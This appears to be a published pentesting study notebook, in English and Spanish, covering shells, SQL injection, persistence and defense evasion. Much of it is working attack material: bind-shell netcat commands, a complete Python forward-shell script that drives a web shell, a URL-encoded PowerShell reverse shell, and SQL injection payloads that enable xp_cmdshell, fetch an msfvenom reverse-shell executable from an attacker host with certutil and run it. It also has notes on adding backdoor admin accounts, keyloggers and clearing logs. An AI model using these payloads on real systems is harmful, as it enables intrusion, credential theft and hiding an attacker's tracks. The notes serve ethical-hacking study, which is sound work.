- When the **code executed** on the target **is used to start a listener** attached to a shell directly on the target.T
- Advantage of **not requiring** any configuration on your **own network**, but may be prevented by firewalls protecting the target.
- We are _listening_ on the target, then connecting to it with our own machine.

exec a shell in a port in the victim machine, then the attacker connect to that port and gain accces to a shell
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Bind shell
### On the target(listener)
```bash
nc -lnvp <port> -e /bin/bash
```

On Linux, however, we would instead use this code to create a listener for a bind shell:
[[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Or get a cmd on windows
```sh
nc -lvnp <port> -e "cmd.exe"
```
### On the attacker
```bash
nc <target-ip> <chosen-port>
```

</div></div>


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

When the firewall block [[Operative System/Linux/Commands/Reverse shell\|reverse shell]]
named pipes
mkfifo

https://github.com/s4vitar/ttyoverhttp

``` python
#!/usr/bin/python3

import requests, time, threading, pdb, signal, sys
from base64 import b64encode
from random import randrange

class AllTheReads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput = """echo '' > %s""" % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
		}
	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
	}
	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
	return result

def ReadCmd():
        GetOutput = """/bin/cat %s""" % (stdout)
        output = RunCmd(GetOutput)
        return output

def SetupShell():
	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s""" % (stdin)
erasestdout = """/bin/rm %s""" % (stdout)

SetupShell()

ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	print("[*] Removing files...\n")
	RunCmd(erasestdin)
	RunCmd(erasestdout)
	print("[*] All files have been deleted\n")
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

while True:
	cmd = input("> ")
	WriteCmd(cmd + "\n")
	time.sleep(1.1)
```

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Interactive
- If you've used **Powershell, Bash, Zsh, sh**, or any other standard **CLI** environment then you will be used to interactive shells.
- These allow you to **interact with programs after executing them**.
- For example, take the SSH login prompt:  
![](https://i.imgur.com/0ayLj8L.png)  
Here you can see that it's asking _interactively_ that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.
## _Non-Interactive_
- Don't give you that luxury.
- You are **limited** to using programs which **do not require user interaction** in order to run properly.
- Unfortunately, the **majority** of simple reverse and bind shells are **non-interactive**, which can make **further exploitation trickier**.
- Let's see what happens when we try to run SSH in a non-interactive shell:  
![](https://i.imgur.com/rXyEDKU.png)  
Notice that the `whoami` command (which is non-interactive) **executes perfectly**, but the `ssh` command (which _is_ interactive) **gives us no output at al**l.
As an interesting side note, **the output of an interactive** command _does_ go somewhere, however, figuring out **where** is an exercise for you to attempt on your own. Suffice to say that **interactive programs do not work in non-interactive shells.**

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Search an pseudoshell on a webpage
```sh
commix -u URL --data param=webpage.org --os windows
```

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



https://pentestmonkey.net/

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- The options are often more limited.
- It's sometimes possible to find passwords for running services in the registry.
- VNC servers, for example, frequently leave passwords in the registry stored in plaintext. 
- Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  or `C:\xampp\FileZilla Server\FileZilla Server.xml` . 
  These can be MD5 hashes or in plaintext, depending on the version.

- Ideally you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges.
- In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:
```sh
net user <username> <password> /add
net localgroup administrators <username> /add
```

- Instead to get a revershell on php, get a RCE powershelll
often easiest to obtain RCE using a web shell
copied into the URL as the `cmd` argument:
```php
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%
```

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Ejecución del código en el dispositivo de la víctima
- 

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Immunity Debugger
# OllyDbg

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To train
www.testphp.vulnweb.com
https://github.com/appsecco/sqlinjection-training-app
- Para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos.
- Attack technique that exploits how web applications handle user input, particularly in SQL queries.
- When a web application incorporates user input into SQL queries without proper validation and sanitisation, it opens the door to SQL injection. For example, consider our previous PHP code for fetching user input to search for ornament colours:
![Pasted image 20240417194728.png](/img/user/Pasted%20image%2020240417194728.png)
```php
// Retrieve the GET parameter and save it as a variable
$colour = $_GET['colour'];

// Execute an SQL query with the user-supplied variable
$query = "SELECT * FROM tbl_ornaments WHERE colour = '$colour'";
$result = sqlsrv_query($conn, $query);
```

For instance, instead of searching for a benign colour, they might input `' OR 1=1 --` as the input parameter, which would transform the query into:
```sql
SELECT * FROM tbl_ornaments WHERE colour = '' OR 1=1 --'
```
- `' OR` is part of the injected code, where **OR** is a logical operator in SQL that allows for multiple conditions. In this case, the injected code appends a secondary **WHERE** condition in the query.
- `1=1` is the condition following the **OR** operator. This condition is always true because, in SQL, **1=1** is a simple equality check where the left and right sides are equal. Since 1 always equals 1, this condition always evaluates to true.
- The `--` at the end of the input is a comment in SQL. It tells the database server to ignore everything that comes after it. Ending with a comment is crucial for the attacker because it nullifies the rest of the query and ensures that any additional conditions or syntax in the original query are effectively ignored.
- The condition `colour = ''` is empty, and the `OR 1=1` condition is always true, effectively making the entire **WHERE** condition true for every row in the table.
```sql
' OR 1=1 --
```
![Pasted image 20231212212627.png](/img/user/Networking/Seguridad%20en%20redes/Fundamentos%20de%20seguridad%20ofensiva/attachments/Pasted%20image%2020231212212627.png)
As a result, this SQL injection successfully manipulates the query to return **all rows** from the `tbl_ornaments` table, regardless of the actual ornament colour values.

# A Caution Around OR 1=1
- It's crucial to emphasise the potential risks of using the `OR 1=1` payload. While commonly used for illustration, injecting it without caution can lead to unintended havoc on a database.
- SQL injection payloads that return all rows can lead to unintended consequences when injected into different types of statements, such as `UPDATE` or `DELETE`
- Imagine injecting it into a query that **updates** a specific user's information
- This lack of specificity in the payload makes it a risky choice for penetration testers who might inadvertently cause significant data loss or alterations.
- For instance, `bob' AND 1=1--` would update Bob's record, while `bob' AND 1=2--` would not. This still demonstrates the SQL injection vulnerability without putting the entire table's records at risk.

# Stacked Queries
- SQL injection attacks can come in various forms. A technique that often gives an attacker a lot of control is known as a "**stacked query**".
- The semicolon typically signifies one statement's conclusion and another's commencement.
- Aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional.
- Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

Suppose our attacker in the previous example wants to go beyond just retrieving all rows and intends to **insert** some malicious data into the database. They can modify the previous injection payload to this:

```sql
' ; INSERT INTO tbl_ornaments (elf_id, colour, category, material, price) VALUES (109, 'Evil Red', 'Broken Candy Cane', 'Coal', 99.99); --
```

When the web application processes this input, here's the resulting query the database would execute:

```sql
SELECT * FROM tbl_ornaments WHERE colour = '' ; INSERT INTO tbl_ornaments (elf_id, colour, category, material, price) VALUES (109, 'Evil Red', 'Broken Candy Cane', 'Coal', 99.99); --'
```

As a result, the attacker successfully ends the original query using a semicolon and introduces an additional SQL statement to insert malicious data into the `tbl_ornaments` table. This showcases the potential impact of stacked queries, allowing attackers to not only manipulate the retrieved data but also perform permanent data modification.
# Testing for SQL Injection
```sql
http://10.10.48.197/giftresults.php?age='&interests=toys&budget=30
```

we can visualise what the underlying PHP script might look like:
```php
$age = $_GET['age'];
$interests = $_GET['interests'];
$budget = $_GET['budget'];

$sql = "SELECT name FROM gifts WHERE age = '$age' AND interests = '$interests' AND budget <= '$budget'";

$result = sqlsrv_query($conn, $sql);
```

```sql
http://10.10.48.197/giftresults.php?age=' OR 1=1 --
```

# Calling Stored Procedures

As mentioned, **stacked queries** can be used to call **stored procedures** or functions within a database management system. You can think of stored procedures as extended functions offered by certain database systems, serving various purposes such as enhancing performance and security and encapsulating complex database logic.
## xp_cmdshell
**xp_cmdshell** is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server. It provides a mechanism for SQL Server to interact directly with the host operating system's command shell. While it can be a powerful administrative tool, it can also be a security risk if not used cautiously when enabled.

It is also possible to manually enable **xp_cmdshell** in SQL Server through `EXECUTE` (**EXEC**) queries. Still, it requires the database user to be a member of the **sysadmin** fixed server role or have the `ALTER SETTINGS` server-level permission to execute this command. However, as mentioned previously, misconfigurations that allow this execution are not too uncommon.

attempt to enable **xp_cmdshell**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Converting these into a single stacked SQLi payload will look like this:
```sql
http://10.10.48.197/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

## RCE
Create the rce file
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
```

Get the file
```sql
http://10.10.48.197/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
```

Start a netcat Listener

```shell-session
nc -lnvp 4444
```

Now, we can run one final stacked query to execute the **reverse.exe** file we previously saved in the `C:\Windows\Temp` directory:
```sql
http://10.10.167.111/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
```

# [[Pentesting Web/sqlmap\|sqlmap]]
sql injection
Use request malicious to get access the db
![Pasted image 20230909095718.png](/img/user/Networking/Seguridad%20en%20redes/Fundamentos%20de%20seguridad%20ofensiva/attachments/Pasted%20image%2020230909095718.png)



# In-Band
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- easiest type to detect and exploit
- refers to the same method of communication being used to exploit the vulnerability and also receive the results, 
- for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen.
- This can often be used to enumerate a whole database.
- aprovecha **errores en el código SQL** para obtener información.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page.
- most common way of extracting large amounts of data via an SQL Injection vulnerability.
- Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.

</div></div>

## Testing
### Check for show error
Add single apostrophes ( ' ) or a quotation mark ( " ).
```sql
IP/page.php?id=1'
```
### Check delay
```sql
IP/page.php?id=1' and sleep(5)-- -
```
### Identify column number 
(Important: the number of columns depend of how the request is being done)
Use `-- -` Or use the comment `#`
```sql
IP/page.php?id=1' order by 47-- -
```

```sql
IP/page.php?id=1 order by 47-- -
```
Add 1, 2, 3, 4 ... until the error disappear
```sql
IP/page.php?id=1 UNION SELECT 1,2,3
```
## Enum
### Check column number
With the correct number of columns the result will be TRUE
Use a incorrect number like 4747 or -4747
```sql
id=4747' union select 1,2,3--
```
### Enum db
List all dbnames
```sql
IP/page.php?id=4747' union select group_concat(schema_name) FROM information_schema.schemata-- -
```
### Enum db name
set a high number that don't exist in the db
```sql
IP/page.php?id=4747' union select 1,2,database()-- -
```
### Enum tables
- the method **group_concat()** gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas.
- The next thing is the **information_schema** database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to.
```sql
IP/page.php?id=4747' union select group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'dbnamehere'-- -
```
### Enum columns
List column names of a table
```sql
id=4747' union select group_concat(column_name) FROM information_schema.columns WHERE table_name = 'table_name'-- -
```
### Enum rowsG
```sql
id=4747' union select group_concat(username,':',password SEPARATOR '<br>') FROM table_name-- -
```

# Blind
- the error messages have been disabled
- Works similar to in-band but with no error shows
## Test
### Check for error with no text shown
Add single apostrophes ( ' ) or a quotation mark ( " ).
```sql
page.php?id=1'
```
### Identify column number 
(Important: the number of columns depend of how the request is being done)
Use `-- -` Or use the comment `#`
```sql
=1' order by 2-- -
```
- Use a valid username id
- Just with the correct number the username will show
- With an incorrect number of columns, none is shown

Add 1, 2, 3, 4 until the result show
```sql
=1 UNION SELECT 1,2,3
```
## Authentication Bypass
- The web application is asking the database "do you have a user with the username **bob** and the password **bob123**?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 
- Taking the above information into account, it's unnecessary to enumerate a valid username/password pair.
- We just need to create a database query that replies with a yes/true.
The form of auth is:
```sql
select * from users where username='%username%' and password='%password%' LIMIT 1;
```

N.B The **%username%** and **%password%** values are taken from the login form fields, the initial values in the SQL Query box will be blank as these fields are currently empty.
To make this into a query that always returns as true, we can enter the following into the password field:
`' OR 1=1;--`

```sql
select * from users where username='' and password='' OR 1=1;--' LIMIT 1;
```
## Boolean based
- Refers to the response we receive back from our injection attempts which could be a
- true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes.
- That outcome confirms to us that our SQL Injection payload was either successful or not.
- On the first inspection, you may feel like this limited response can't provide much information.
- Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.
### Check if bolean field is able
**https://website.thm/checkuser?username=admin**
- The browser body contains the contents of **{"taken":true}**.
- Because the **taken** value is set to **true**, we can assume the username admin is already registered.
- Id set **admin4747**, and upon pressing enter, you'll see the value **taken** has now changed to **false**.
- we can start appending to this to try and make the database confirm true things, which will change the state of the taken field from false to true.
```sql
username=admin4747
```

```sh
curl -s -I -x GET "http://webpage_or_ip.com"
```
### Check column number
With the correct number of columns the result will be TRUE
```sql
username=admin4747' union select 1,2,3;--
```
### Enum db
- Now that our number of columns has been established
- We can work on the enumeration of the database. Our first task is discovering the database name.
- We can do this by using the built-in **database()** method and then using the **like** operator to try and find results that will return a true status.

Try the below username value and see what happens:
```sql
username=admin4747' union select 1,2,3 where database() like '%';--
```

- We get a true response because, in the like operator, we just have the value of **%**, which will match anything as it's the wildcard value.
- If we change the wildcard operator to **a%**, you'll see the response goes back to false, which confirms that the database name does not begin with the letter **a**.
### Enum table names
enumerate table names using a similar method by utilising the information_schema database.
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```
### Enum column names
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--
```

you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named **id**.
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';--
```
### Enum usernames
If we know the table name 'users' and the column name 'username'
```sql
admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
```
### Enum passwords
```sql
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--
```
## Time Based
- is very similar to the above Boolean based, in that the same requests are sent,
- but there is no visual indicator of your queries being wrong or right this time
### Identify column number
If there was no pause in the response time, we know that the query was unsuccessful,
```sql
admin123' UNION SELECT SLEEP(5);--
```
This payload should have produced a 5-second time delay, which confirms the successful execution
```sql
admin123' UNION SELECT SLEEP(5),2;--
```
### Enum Table name
```sql
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```
# Out-of-Band
- Isn't as common as it either
- depend son specific features being enabled on the database server
- Or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.
- two different communication channels,
	1. one to launch the attack
	2. and the other to gather the results.
- For example, the attack channel could be a web request, and the data gathering channel could be monitoring **HTTP/DNS** requests made to a service you control.

1. An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.
2. The Website makes an SQL query to the database which also passes the hacker's payload.
3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/75103b88e95d4eda2244dbb360cba4ff.png)
# Tools to exploit it
## [[Pentesting Web/sqlmap\|sqlmap]]
# Remedation
## Prepared Statements (With Parameterized Queries):
- In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards.
- Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data.
- As a benefit, it also makes your code look a lot cleaner and easier to read.
## Input Validation:
- Input validation can go a long way to protecting what gets put into an SQL query.
- Employing an allow list can restrict input to only certain strings
- or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 
## Escaping User Input:
- Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks.
- Escaping user input is the method of prepending a backslash `(\)` to these characters, which then causes them to be parsed just as a regular string and not a special character.

</div></div>


</div></div>


</div></div>


# 6 Persistence
Any access, action or change to a system that gives an attacker persistent presence on the system.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Trojans, spywares, backdoors, keyloggers

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### Expotation for client execution
Las prácticas de codificación no seguras en el software pueden hacerlo vulnerable a varios ataques.
Los atacantes pueden aprovechar las vulnerabilidades del software a través de explotaciones enfocadas y dirigidas con un
objetivo de ejecución arbitraria de código para mantener el acceso al sistema remoto de destino.
### Sheduled task
Utilidades como at y schtasks, se pueden utilizar junto con el Programador de tareas de Windows para ejecutar
programas específicos en una fecha y hora programadas.
Los atacantes pueden ejecutar programas maliciosos al inicio del sistema o programarlo para una fecha y hora específicas
para mantener el acceso al sistema de destino.
### Service execution
Los servicios del sistema son programas que se ejecutan y operan en el backend de un sistema operativo.
Los atacantes ejecutan archivos binarios o comandos que pueden comunicarse con los servicios del sistema Windows,
como el Service Control Manager, para mantener el acceso al sistema remoto.

### Windows management instrumentation (WMI)
WMI es una característica de la administración de Windows que proporciona una plataforma para acceder a los recursos del
sistema de Windows de forma local y remota.
Los atacantes pueden explotar las características de WMI para interactuar con el sistema de destino remoto y utilizarlo para
realizar la recopilación de información sobre los recursos del sistema y seguir ejecutando código para mantener el acceso al
sistema de destino.

### Windows remote management (WinRM)
WinRM es un protocolo basado en Windows diseñado para permitir a un usuario ejecutar un archivo ejecutable, modificar
los servicios del sistema y el registro en un sistema remoto.
Los atacantes pueden utilizar el comando winrm para interactuar con WinRM y ejecutar una carga útil en el sistema
remoto como parte del movimiento lateral.

### Remote exec
RemoteExec instala remotamente aplicaciones,
ejecuta programas/scripts y actualiza archivos y
carpetas en sistemas Windows de toda la red.

### pupy
### PDQ Deploy
### Dameware remote support
### manageEngine desktop central
### PsExec

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Los registradores de pulsaciones de teclas son programas o dispositivos de hardware que monitorizan cada pulsación de tecla
mientras el usuario escribe en un teclado, se registra en un archivo o las transmite a una ubicación remota.
Las aplicaciones legítimas de los registradores de pulsaciones de teclas son, por ejemplo, en entornos de oficina e industriales
para supervisar las actividades informáticas de los empleados y en el entorno doméstico, donde los padres pueden vigilar y
espiar la actividad de los niños
Permite al atacante recopilar información confidencial sobre la víctima, como el ID del correo electrónico, las contraseñas, los
datos bancarios, la actividad de las salas de chat, el IRC y los mensajes instantáneos
Los keyloggers físicos se colocan entre el hardware del teclado y el sistema operativo.

![Pasted image 20230909130637.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909130637.png)

![Pasted image 20230909130959.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909130959.png)

## ardamax
- Lifetime license
- cheap
- Important: keep update
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



 Utiliza bloqueadores de ventanas emergentes y evita abrir correos electrónicos basura.
■ Instala programas antispyware/antivirus y mantén las firmas actualizadas.
■ Instala un software profesional de cortafuegos y un software anti-codificación.
■ Reconocer los correos electrónicos de phishing y eliminarlos.
■ Actualizar y parchear regularmente el software del sistema.
■ No haga clic en enlaces de correos electrónicos no solicitados o dudosos que puedan dirigirles a sitios maliciosos.
■ Utilice programas informáticos que comprueben y supervisen con frecuencia los cambios en su sistema o red.
■ Instale un IDS basado en el host, que pueda supervisar su sistema y desactivar la instalación de keyloggers.
■ Utilice una contraseña de un solo uso (OTP) u otros mecanismos de autenticación, como la verificación en dos o
varios pasos, para autenticar a los usuarios.
■ Habilite las listas blancas de aplicaciones para bloquear la descarga o instalación de software no deseado, como
los keyloggers.
■ Utilice la VPN para habilitar una capa adicional de protección mediante el cifrado.

</div></div>


</div></div>

## ![[Spyware \|Spyware ]]
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Los rootkits son programas que ocultan su presencia, así como las actividades maliciosas del atacante, otorgandoles acceso completo al servidor o host en ese momento, y en el futuro.
- Los rootkits reemplazan ciertas llamadas y utilidades del sistema operativo con sus propias versiones modificadas de esas rutinas que, a su vez, socavan la seguridad del sistema de destino haciendo que se ejecuten funciones maliciosas.
- Un rootkit típico consta de programas de puerta trasera, programas DDoS, rastreadores de paquetes, utilidades de limpieza de registros, bots IRC, etc.
### El atacante coloca un rootkit por:
Análisis de ordenadores y servidores vulnerables en la web.
Envolviéndolo en un paquete especial como un juego.
Instalarlo en computadoras públicas o computadoras
corporativas a través de ingeniería social.
Lanzamiento de un ataque de día cero (escalada de
privilegios, desbordamiento de búfer, explotación del kernel
de Windows, etc.).

### Objetivos de un rootkit:
Rootear el sistema host y obtener acceso remoto por la puerta
trasera.
Para enmascarar las pistas de los atacantes y la presencia de
aplicaciones o procesos maliciosos.
Para recopilar datos confidenciales, tráfico de red, etc. desde el
sistema al que los atacantes podrían estar restringidos o no poseer
acceso.
Para almacenar otros programas maliciosos en el sistema y actuar
como un recurso de servidor para las actualizaciones de bots.

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### Hypervisor level rootkit
Actúa como un hipervisor y modifica  la  secuencia  de arranque  del  sistema informático para cargar el sistema operativo host como una máquina virtual.
### Hardware firmware rootkit
Se oculta en dispositivos de hardware o firmware de plataforma  que  no  se inspeccionan en busca de integridad del Código.
### Kernel level rootkit
Añade código malicioso o reemplaza el kernel original del sistema operativo y el bacalao del controlador del dispositivo.
### Boot loader level rootkit
Reemplaza el cargador de arranque original por el controlado por un atacante remoto.
### Aplication level/user mode rootkit
Reemplaza los binarios deaplicaciones regulares con un troyano falso o modifica el comportamiento  de  las aplicaciones  existentes mediante la inyección de código malicioso.
### Library level rootkits
Reemplaza las  llamadas originales del sistema por falsas  para  ocultar información  sobre el atacante.

</div></div>

## how it works
![Pasted image 20230909132750.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909132750.png)
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



![Pasted image 20230909132832.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909132832.png)


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



■ Reinstalar el sistema operativo/aplicaciones desde una fuente de confianza después de hacer una copia de seguridad
de los datos críticos.
■ Mantener procedimientos de instalación automatizados y bien documentados.
■ Realizar análisis de volcado de memoria del kernel para determinar la presencia de rootkits.
■ Endurecer la estación de trabajo o el servidor contra el ataque.
■ Educar al personal para que no descargue ningún archivo/programa de fuentes no confiables.
■ Instale cortafuegos basados en la red y en el host y compruebe con frecuencia si hay actualizaciones.
■ Garantizar la disponibilidad de medios de restauración de confianza.
■ Actualizar y parchear los sistemas operativos, las aplicaciones y el firmware.
- Dont let an user install anything

</div></div>


</div></div>


</div></div>

# 7 Defense Evasion
Techniques an attacker may specifically use for evading detection or avoiding other defenses.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Una vez que los intrusos han obtenido con éxito el acceso de administrador en un sistema, tratarán de cubrir sus pistas para evitar la detección.

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Los intrusos desactivan la auditoría inmediatamente  después  de obtener  privilegios de administrador
- Hacia el final de su estancia, los intrusos simplemente activan la auditoría de nuevo utilizando auditpol.exe

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- El  atacante utiliza la utilidadClear_Event_Viewer_Logs.bat para borrar los registros de seguridad, del sistema y de la aplicación
- Si el sistema es explotado con Metasploit, el atacante utiliza el shell meterpreter para borrar todos los registros de un sistema Windows
- El atacante utiliza el comando Clear-EventLog para borrar todos los registros de eventos de PowerShell de los equipos locales o remotos
- El atacante utiliza la utilidad wevtutil para borrar los registros de eventos relacionados con el sistema, la aplicación y la seguridad

### Manual clearing logs
![Pasted image 20230911091104.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230911091104.png)

Elimine los datos más recientes (MRU), elimine las cookies, borre la caché, desactive Autocompletar y borre los datos de la barra de herramientas de los navegadores
![Pasted image 20230911091220.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230911091220.png)

### Covering bash Shell tracks
![Pasted image 20230911091247.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230911091247.png)

### Covering bash on an OS
![Pasted image 20230911091423.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230911091423.png)


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



![Pasted image 20230911091534.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230911091534.png)
![Pasted image 20230911091549.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230911091549.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



![Pasted image 20230911091642.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230911091642.png)

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía es una técnica de ocultar un mensaje secreto dentro de un mensaje ordinario y extraerlo en el destino para mantener la confidencialidad de los datos.
- Utilizar una imagen gráfica como portada es el método más popular para ocultar los datos en archivos.
- El atacante puede utilizar esteganografía para ocultar mensajes como una lista de los servidores comprometidos, código fuente para la herramienta de piratería, o planes para futuros ataques.
![Pasted image 20230910110916.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910110916.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



![Pasted image 20230910111003.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111003.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



